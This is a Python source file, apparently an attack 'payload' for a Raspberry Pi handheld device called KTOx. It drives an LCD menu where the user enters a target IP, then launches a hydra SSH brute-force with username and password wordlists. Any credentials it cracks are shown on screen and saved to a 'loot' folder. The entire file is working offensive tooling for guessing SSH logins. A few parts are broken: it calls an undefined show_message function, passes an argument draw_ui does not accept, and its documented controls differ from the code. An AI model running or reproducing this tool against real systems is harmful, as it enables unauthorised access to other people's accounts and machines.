#!/usr/bin/env python3
"""
KTOx *payload* – **SSH Brute-Force Attack**
==============================================
This payload performs an SSH brute-force attack against a target IP address
using `hydra`. It allows the user to input the target IP directly on the LCD
and displays the attack status and any found credentials. The attack runs
in a background thread to keep the UI responsive.

Features:
- Interactive UI for entering target IP address.
- Uses `hydra` for SSH brute-forcing with specified wordlists.
- Displays attack status and found credentials on the LCD.
- Runs brute-force in a background thread.
- Graceful exit via KEY3 or Ctrl-C, ensuring `hydra` is terminated.
- Dynamically determines the active network interface.

Controls:
- MAIN SCREEN:
    - OK: Start/Enter Target IP
    - KEY3: Exit Payload
- IP INPUT SCREEN:
    - UP/DOWN: Change digit at cursor position
    - LEFT/RIGHT: Move cursor
    - OK: Confirm IP and start attack
    - KEY3: Cancel IP input and return to main screen
"""

import sys
import os
import time
import signal
import subprocess
import threading
import re # For IP validation

# Prefer /root/KTOx for imports; fallback to repo-relative
KTOX_ROOT = '/root/KTOx' if os.path.isdir('/root/KTOx') else os.path.abspath(os.path.join(__file__, '..', '..'))
if KTOX_ROOT not in sys.path:
    sys.path.insert(0, KTOX_ROOT)
# Also add wifi subdir if present
_wifi_dir = os.path.join(KTOX_ROOT, 'wifi')
if os.path.isdir(_wifi_dir) and _wifi_dir not in sys.path:
    sys.path.insert(0, _wifi_dir)
import RPi.GPIO as GPIO
import LCD_Config
import LCD_1in44
from PIL import Image, ImageDraw, ImageFont

# WiFi Integration - Import dynamic interface support
try:
    from wifi.ktox_integration import get_best_interface
    WIFI_INTEGRATION_AVAILABLE = True
except ImportError:
    WIFI_INTEGRATION_AVAILABLE = False
    def get_best_interface():
        return "eth0" # Fallback

TARGET_IP = "192.168.1.20"
USER_LIST = os.path.join(KTOX_ROOT, "wordlists", "ssh_users.txt")
PASS_LIST = os.path.join(KTOX_ROOT, "wordlists", "ssh_pass.txt")
LOOT_DIR = os.path.join(KTOX_ROOT, "loot", "Bruteforce")

PINS = { "UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26, "OK": 13, "KEY1": 21, "KEY2": 20, "KEY3": 16 }
GPIO.setmode(GPIO.BCM)
for pin in PINS.values(): GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)
LCD = LCD_1in44.LCD()
LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
WIDTH, HEIGHT = 128, 128
FONT_TITLE = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 12)
FONT = ImageFont.load_default()

running = True
attack_thread = None
hydra_process = None # To keep track of the hydra subprocess
status_msg = "Press OK to start"
found_creds = ""
current_ip_input = "192.168.1.20"
ip_input_cursor_pos = 0
ip_input_segment = 0
NETWORK_INTERFACE = get_best_interface() # Dynamically get the best interface

def cleanup(*_):
    global running
    running = False
    stop_attack_process() # Ensure hydra is terminated

signal.signal(signal.SIGINT, cleanup)
signal.signal(signal.SIGTERM, cleanup)

def stop_attack_process():
    """Terminate the hydra process if it's running."""
    global hydra_process
    if hydra_process and hydra_process.poll() is None:
        try:
            hydra_process.terminate()
            hydra_process.wait(timeout=5)
            print("Hydra process terminated.")
        except (subprocess.TimeoutExpired, ProcessLookupError):
            hydra_process.kill()
            print("Hydra process killed.")
        hydra_process = None

def draw_ui(screen_state="main", message_lines=None):
    img = Image.new("RGB", (128, 128), "black")
    d = ImageDraw.Draw(img)
    
    # Header
    d.text((5, 5), "SSH Brute-Force", font=FONT_TITLE, fill="#FF0000")
    d.line([(0, 22), (128, 22)], fill="#FF0000", width=1)
    d.text((5, 115), f"IF: {NETWORK_INTERFACE}", font=FONT, fill="gray") # Display interface

    if message_lines:
        if isinstance(message_lines, str):
            message_lines = [message_lines]
        y_offset = (HEIGHT - len(message_lines) * 12) // 2
        for line in message_lines:
            bbox = d.textbbox((0, 0), line, font=FONT)
            w = bbox[2] - bbox[0]
            x = (WIDTH - w) // 2
            d.text((x, y_offset), line, font=FONT, fill="yellow")
            y_offset += 12
    elif screen_state == "main":
        if found_creds:
            d.text((10, 40), "SUCCESS!", font=FONT_TITLE, fill="lime")
            d.text((10, 60), found_creds, font=FONT, fill="white")
        else:
            d.text((10, 60), status_msg, font=FONT, fill="yellow")
            
        d.text((5, 100), "OK=Start | KEY3=Exit", font=FONT, fill="cyan")
    
    LCD.LCD_ShowImage(img, 0, 0)

def handle_ip_input_logic(initial_ip):
    global current_ip_input, ip_input_cursor_pos
    current_ip_input = initial_ip
    
    # The character set for IP address input
    char_set = "0123456789."
    char_index = 0
    
    input_ip = ""
    
    while running:
        # Draw the UI for IP input
        img = Image.new("RGB", (128, 128), "black")
        d = ImageDraw.Draw(img)
        d.text((5, 5), "Enter Target IP", font=FONT_TITLE, fill="cyan")
        d.line([(0, 22), (128, 22)], fill="cyan", width=1)
        
        # Display the current input
        d.text((5, 40), f"IP: {input_ip}", font=FONT, fill="white")
        
        # Display the character selection
        d.text((5, 70), f"Select: < {char_set[char_index]} >", font=FONT_TITLE, fill="yellow")
        
        d.text((5, 100), "UP/DOWN=Char | OK=Add", font=FONT, fill="cyan")
        d.text((5, 115), "KEY1=Del | KEY2=Save | KEY3=Cancel", font=FONT, fill="cyan")
        LCD.LCD_ShowImage(img, 0, 0)

        btn = None
        for name, pin in PINS.items():
            if GPIO.input(pin) == 0:
                btn = name
                while GPIO.input(pin) == 0:
                    time.sleep(0.05)
                break
        
        if btn == "KEY3":
            return None
        
        if btn == "OK":
            input_ip += char_set[char_index]
            time.sleep(0.2)

        if btn == "KEY1": # Backspace
            input_ip = input_ip[:-1]
            time.sleep(0.2)

        if btn == "UP":
            char_index = (char_index + 1) % len(char_set)
            time.sleep(0.2)
        
        if btn == "DOWN":
            char_index = (char_index - 1 + len(char_set)) % len(char_set)
            time.sleep(0.2)

        # Let's use KEY2 to confirm the IP
        if GPIO.input(PINS["KEY2"]) == 0:
            parts = input_ip.split('.')
            if len(parts) == 4 and all(p.isdigit() and 0 <= int(p) <= 255 for p in parts):
                return input_ip
            else:
                show_message(["Invalid IP!", "Try again."], "red")
                time.sleep(2)
                input_ip = "" # Reset on invalid
        
        time.sleep(0.1)
    return None

def run_attack(target_ip):
    global status_msg, found_creds, hydra_process
    
    os.makedirs(LOOT_DIR, exist_ok=True)
    output_file = os.path.join(LOOT_DIR, f"ssh_brute_{target_ip}.txt")
    
    status_msg = f"Attacking {target_ip}..."
    draw_ui("main") # Update UI with status
    
    try:
        command = ["hydra", "-L", USER_LIST, "-P", PASS_LIST, "-t", "4", "-o", output_file, f"ssh://{target_ip}"]
        # Use Popen to allow termination
        hydra_process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        stdout, stderr = hydra_process.communicate(timeout=600) # Wait for process to complete or timeout
        
        if hydra_process.returncode == 0: # Hydra usually exits 0 even if no creds found
            with open(output_file, "r") as f:
                for line in f:
                    if "host:" in line and "login:" in line:
                        parts = line.split()
                        login = parts[parts.index("login:")+1]
                        password = parts[parts.index("password:")+1]
                        found_creds = f"{login}:{password}"
                        status_msg = "Credentials Found!"
                        return

            status_msg = "No creds found."
        else:
            status_msg = f"Hydra exited with error: {hydra_process.returncode}"
            print(f"Hydra stderr: {stderr}", file=sys.stderr)

    except subprocess.TimeoutExpired:
        stop_attack_process() # Ensure hydra is killed if it times out
        status_msg = "Attack timed out!"
    except Exception as e:
        status_msg = "Attack failed!"
        print(f"Hydra attack failed: {e}", file=sys.stderr)
    finally:
        hydra_process = None # Clear process reference
    draw_ui("main") # Update UI with final status

if __name__ == "__main__":
    try:
        if subprocess.run("which hydra", shell=True, capture_output=True).returncode != 0:
            draw_ui(message_lines=["ERROR:", "`hydra` not found!", "Install with:", "`sudo apt install hydra`"])
            time.sleep(5)
            raise SystemExit("`hydra` command not found.")
        if not (os.path.exists(USER_LIST) and os.path.exists(PASS_LIST)):
            draw_ui(message_lines=["ERROR:", "Wordlists not found!", "Check:", f"{USER_LIST}", f"{PASS_LIST}"])
            time.sleep(5)
            raise SystemExit("Wordlists not found.")

        while running:
            draw_ui("main")
            
            if GPIO.input(PINS["KEY3"]) == 0:
                cleanup()
                break
            
            if GPIO.input(PINS["OK"]) == 0:
                new_ip = handle_ip_input_logic(TARGET_IP)
                if new_ip:
                    TARGET_IP = new_ip
                    if not (attack_thread and attack_thread.is_alive()):
                        found_creds = ""
                        attack_thread = threading.Thread(target=run_attack, args=(TARGET_IP,), daemon=True)
                        attack_thread.start()
                time.sleep(0.3)

            time.sleep(0.1)

    except (KeyboardInterrupt, SystemExit):
        pass
    except Exception as e:
        print(f"[ERROR] {e}", file=sys.stderr)
        draw_ui(message_lines=[f"CRITICAL ERROR:", f"{str(e)[:20]}"], color="red")
        time.sleep(3)
    finally:
        stop_attack_process() # Ensure hydra is terminated on final exit
        LCD.LCD_Clear()
        GPIO.cleanup()
        print("SSH Brute-Force payload finished.")